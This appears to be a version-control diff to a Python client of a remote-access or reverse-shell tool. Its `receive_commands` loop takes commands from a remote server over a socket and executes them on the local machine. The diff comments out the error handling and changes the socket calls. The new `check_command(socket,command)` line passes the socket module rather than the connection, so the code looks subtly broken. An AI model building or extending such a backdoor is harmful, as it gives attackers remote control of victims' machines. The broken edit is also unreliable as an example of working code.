@@ -24,8 +24,6 @@ from functions import *
 import signal
 import struct
 
-
-
 class Client(object):
 
     def __init__(self):
@@ -76,11 +74,11 @@ class Client(object):
         return
 
     def receive_commands(self):
-        """ Receive commands from remote server and run on local machine """
+        #Receive command
         while True:
-            command = s.recv(1024)
+            command = self.socket.recv(1024)
             command = command.decode()
-            check_command(s,command)
+            check_command(socket,command)
         self.socket.close()
         return
 
@@ -97,10 +95,10 @@ def main():
             time.sleep(5)     
         else:
             break    
-    try:
-        client.receive_commands()
-    except Exception as e:
-        print('Error in main: ' + str(e))
+    #try:
+    client.receive_commands()
+    #except Exception as e:
+    #    print('Error in main: ' + str(e))
     client.socket.close()
     return
 
